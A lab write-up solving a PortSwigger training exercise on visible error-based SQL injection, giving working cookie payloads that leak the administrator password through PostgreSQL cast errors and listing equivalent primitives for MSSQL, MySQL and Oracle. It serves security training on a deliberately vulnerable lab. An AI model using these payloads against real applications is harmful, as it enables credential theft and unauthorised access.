# Lab 17 — Visible error-based SQL injection

> **Practitioner** · [Official lab](https://portswigger.net/web-security/sql-injection/blind/lab-sql-injection-visible-error-based)

**Entry point:** `TrackingId` cookie · **DB:** PostgreSQL

## Goal

Leak the `administrator` password through **verbose database error
messages** using type-cast errors.

## Solution

1. The TrackingId cookie is injectable, results are never returned, but the
   app **displays SQL errors**. Confirm cast errors are reflected:

```
TrackingId: xyz' AND 1=CAST((SELECT 'a') AS int)--
```

→ error: `invalid input syntax for type integer: "a"` — reflection works.

2. Confirm the table contents (should return 200):

```
xyz' AND (SELECT 'a' FROM users LIMIT 1)='a'--
```

3. Cast the username to an integer — its value lands in the error message:

```
xyz' AND CAST((SELECT username FROM users LIMIT 1) AS int)--
```

→ `invalid input syntax for type integer: "administrator"`

4. Same trick with the password:

```
xyz' AND CAST((SELECT password FROM users WHERE username='administrator') AS int)--
```

→ `invalid input syntax for type integer: "<password>"`

5. Log in as `administrator` — lab solved.

## Notes

`CAST(<data> AS int)` is the classic **in-band error** primitive on
PostgreSQL — the target value is embedded verbatim in the exception text.
Equivalent primitives: MSSQL `CONVERT(int, ...)`, MySQL
`EXTRACTVALUE(1, CONCAT(0x7e, (...)))`, Oracle `UTL_INADDR` or
`XMLType(...)` errors.
